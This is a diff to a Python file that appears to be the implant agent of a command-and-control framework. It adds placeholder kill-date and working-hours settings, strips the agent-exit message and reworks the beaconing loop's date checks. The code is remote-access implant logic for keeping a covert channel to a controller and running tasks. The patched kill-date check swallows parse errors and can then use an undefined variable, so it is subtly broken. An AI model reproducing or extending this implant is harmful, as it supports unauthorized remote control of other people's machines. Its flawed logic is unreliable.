@@ -42,9 +42,9 @@ missedCheckins = 0
 jobMessageBuffer = ''
 
 # killDate form -> "MO/DAY/YEAR"
-killDate = ''
+killDate = 'REPLACE_KILLDATE'
 # workingHours form -> "9:00-17:00"
-workingHours = ''
+workingHours = 'REPLACE_WORKINGHOURS'
 
 parts = profile.split('|')
 taskURIs = parts[0].split(',')
@@ -247,8 +247,7 @@ def process_packet(packetType, data, resultID):
     elif packetType == 2:
         # agent exit
 
-        msg = "[!] Agent %s exiting" %(sessionID)
-        send_message(build_response_packet(2, msg, resultID))
+        send_message(build_response_packet(2, "", resultID))
         agent_exit()
 
     elif packetType == 40:
@@ -881,7 +880,7 @@ def get_file_part(filePath, offset=0, chunkSize=512000, base64=True):
 
 while(True):
     try:
-        if workingHours != '':
+        if workingHours != '' and 'WORKINGHOURS' not in workingHours:
             try:
                 start,end = workingHours.split('-')
                 now = datetime.datetime.now()
@@ -898,10 +897,14 @@ while(True):
 
         # check if we're past the killdate for this agent
         #   killDate form -> MO/DAY/YEAR
-        if killDate != "":
+        if killDate != "" and 'KILLDATE' not in killDate:
             now = datetime.datetime.now().date()
-            killDateTime = datetime.datetime.strptime(killDate, "%m/%d/%Y").date()
-            if now > killDateTime:
+            try:
+                killDateTime = datetime.datetime.strptime(killDate, "%m/%d/%Y").date()
+            except:
+                pass
+            
+            if now >= killDateTime:
                 msg = "[!] Agent %s exiting" %(sessionID)
                 send_message(build_response_packet(2, msg))
                 agent_exit()
